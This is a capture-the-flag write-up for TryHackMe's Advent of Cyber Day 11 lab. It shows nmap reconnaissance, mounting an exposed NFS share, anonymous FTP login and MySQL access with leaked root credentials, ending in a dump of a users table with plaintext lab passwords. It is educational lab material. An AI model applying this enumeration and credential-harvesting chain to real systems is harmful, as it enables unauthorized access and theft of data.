# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 11
### References
* MuirlandOracle. (2020, January 6). MuirlandOracle. MuirlandOracle’s Blog. https://muirlandoracle.co.uk/2020/01/06/tryhackme-christmas-2019-challenge-write-up/
## Reconnaissance
```bash
$ sudo nmap -sV -vv -p- 10.10.26.232
PORT      STATE SERVICE  REASON          VERSION
21/tcp    open  ftp      syn-ack ttl 252 vsftpd 3.0.2
22/tcp    open  ssh      syn-ack ttl 252 OpenSSH 7.4 (protocol 2.0)
111/tcp   open  rpcbind  syn-ack ttl 252 2-4 (RPC #100000)
2049/tcp  open  nfs_acl  syn-ack ttl 252 3 (RPC #100227)
3306/tcp  open  mysql    syn-ack ttl 252 MySQL 5.7.28
20048/tcp open  mountd   syn-ack ttl 252 1-3 (RPC #100005)
40603/tcp open  nlockmgr syn-ack ttl 252 1-4 (RPC #100021)
52881/tcp open  status   syn-ack ttl 252 1 (RPC #100024)
Service Info: OS: Unix
```
## What is the password inside the `creds.txt` file?
1. Mount the NFS drive to a local directory:
```bash
$ mkdir $(pwd)/nfs
$ sudo mount 10.10.26.232:/opt/files $(pwd)/nfs
```
2. Copy `creds.txt`:
```bash
$ cp nfs/creds.txt $(pwd)
$ sudo umount nfs
$ rmdir nfs
```
3. Read `creds.txt`:
```bash
$ cat creds.txt
the password is securepassword123
```
**Answer**: `securepassword123`
## What is the name of the file running on port 21?
1. Login to FTP anonymously:
```bash
$ ftp 10.10.26.232 
Connected to 10.10.26.232.
220 (vsFTPd 3.0.2)
Name: anonymous
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
1. Get `file.txt`:
```bash
ftp> binary
200 Switching to Binary mode.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
-rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
ftp> get file.txt
```

**Answer**: `file.txt`
## What is the password after enumerating the database?
1. From `file.txt`:
```
remember to wipe mysql:
root
ff912ABD*
```
2. Login to MySQL with username `root` and password `ff912ABD*`:
```bash
$ mysql -h 10.10.26.232 -u root -p
Enter password: ff912ABD*
```
3. Show databases and use the `data` database:
```sql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
MySQL [(none)]> use data;
```
4. show tables and select all data from the `USERS` table:
```sql
MySQL [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| USERS          |
+----------------+
MySQL [data]> select * from USERS;
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | bestpassword |
+-------+--------------+
```

**Answer**: `bestpassword`